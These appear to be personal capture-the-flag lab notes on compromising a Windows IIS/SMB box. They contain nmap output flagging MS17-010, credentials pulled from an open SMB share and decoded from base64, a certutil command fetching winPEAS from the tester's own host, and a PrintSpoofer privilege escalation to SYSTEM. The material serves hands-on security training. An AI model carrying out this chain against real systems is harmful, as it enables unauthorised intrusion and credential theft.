---
title: relevant
tags:
  - fetus
---
## nmap results:
- `nmap -p- -Pn -sV -O 10.10.84.223 -oN Dscan.txt`:
```sh
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-23 11:17 EDT
Nmap scan report for 10.10.84.223
Host is up (0.23s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
49663/tcp open  http         Microsoft IIS httpd 10.0
49666/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2012|2016|2008|7 (91%)
OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7
Aggressive OS guesses: Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2016 (91%), Microsoft Windows 7 or Windows Server 2008 R2 (85%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1388.04 seconds
```
- `nmap -p- -A -T4 --script vuln 10.10.84.223 -oN Ascan.txt`:
```sh
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-23 11:15 EDT
Nmap scan report for 10.10.84.223
Host is up (0.20s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT      STATE SERVICE        VERSION
80/tcp    open  http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-server-header: Microsoft-IIS/10.0
|_http-csrf: Couldn't find any CSRF vulnerabilities.
135/tcp   open  msrpc          Microsoft Windows RPC
139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds   Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ms-wbt-server?
49663/tcp open  unknown
49666/tcp open  msrpc          Microsoft Windows RPC
49668/tcp open  unknown
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2012|2016|2008|7 (91%)
OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7
Aggressive OS guesses: Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2016 (91%), Microsoft Windows 7 or Windows Server 2008 R2 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)

TRACEROUTE (using port 3389/tcp)
HOP RTT       ADDRESS
1   186.99 ms 10.21.0.1
2   191.37 ms 10.10.84.223

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2200.95 seconds
```
## http enum:
- two ports hosting an http site:
	- `80/tcp    open  http         Microsoft IIS httpd 10.0`
	- `49663/tcp open  http         Microsoft IIS httpd 10.0`
- nothing. just the default IIS pages. directory busting gave nothing 
- checked whatweb:
```
http://10.10.205.87:49663 [200 OK] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.10.205.87], Microsoft-IIS[10.0], Title[IIS Windows Server], X-Powered-By[ASP.NET]
```
## smb enum:
```sh
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        nt4wrksv        Disk      

```
- got `passswords.txt` from the share `nt4wrksv`
- `passwords.txt`:
```sh
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```
- base64 decrypted em. got these creds:
```
Bob:!P@$$W0rD!123
Bill:Juw4nnaM4n420696969!$$$ 
```
## uploading winpeas:
- made a [[python server creation]] and did this with [[certutil]] 
```sh
certutil -urlcache -f http://10.21.154.145:8084/winPEAS.bat winPEAS.bat
```
- winpeas output: [[relevantWinpeasOutput]] 
- ran printSpoofer64.exe and got a root 
	- why: https://medium.com/@laurent.mandine/%EF%B8%8F-printspoofer-how-attackers-hijack-privileges-in-windows-networks-f188ff491e31
---
- IIS webdev service 
- secretsdump.py
- crackmap.exe
- bugsbd interview lab (linux)
- impersonate token attack
- certutilcd C:
- **Security Standards & Compliance:** NIST controls basics, ISO 27001 fundamental
- bluekeep, shellshock